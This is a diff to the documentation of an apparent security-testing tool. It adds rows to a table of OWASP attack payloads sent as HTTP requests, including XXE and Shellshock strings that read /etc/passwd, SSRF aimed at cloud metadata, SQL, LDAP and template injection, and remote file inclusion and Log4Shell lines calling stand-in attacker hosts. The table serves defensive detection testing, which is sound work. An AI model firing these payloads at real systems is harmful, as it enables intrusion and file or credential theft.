@@ -40,6 +40,18 @@ Tests OWASP Top 10 attack patterns. Each test sends a crafted HTTP request to th
 | Command Injection — Backtick | `` `whoami` `` | Sends command injection via backtick |
 | Path Traversal | `../../../../etc/passwd` | Sends directory traversal attack |
 | Log4Shell — JNDI Lookup | `${jndi:ldap://attacker.com/exploit}` | Sends Log4j RCE payload in HTTP header |
+| XXE — XML External Entity | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | Sends XXE payload via POST with XML content type |
+| SSRF — Server-Side Request Forgery | `http://169.254.169.254/latest/meta-data/` | Sends SSRF targeting cloud metadata endpoint |
+| SSTI — Template Injection | `{{7*7}}${7*7}` | Sends template expression payloads |
+| LDAP Injection | `*)(&(objectClass=*))(uid=*)` | Injects LDAP filter metacharacters |
+| XPath Injection | `' or '1'='1' or ''='` | Injects XPath query syntax |
+| CRLF / Header Injection | `%0d%0aSet-Cookie: malicious=true` | Injects CRLF into HTTP headers |
+| Open Redirect | `https://evil.example.com/phishing` | Sends redirect parameter to external site |
+| Blind SQL Injection | `' AND SLEEP(5)-- -` | Sends time-based blind SQLi payload |
+| Insecure Deserialization | `rO0ABXNy...` (Java serialized object) | Sends serialized Java object payload |
+| Shellshock — CVE-2014-6271 | `() { :;}; /bin/cat /etc/passwd` | Sends Shellshock exploit in HTTP headers |
+| Remote File Inclusion | `http://evil.example.com/shell.txt%00` | Sends RFI payload in URL parameter |
+| Information Disclosure | `phpinfo.php\|.env\|.git/config` | Probes common info disclosure paths |
 
 ### Malware/Threats (Anti-Virus & Anti-Spyware)
 
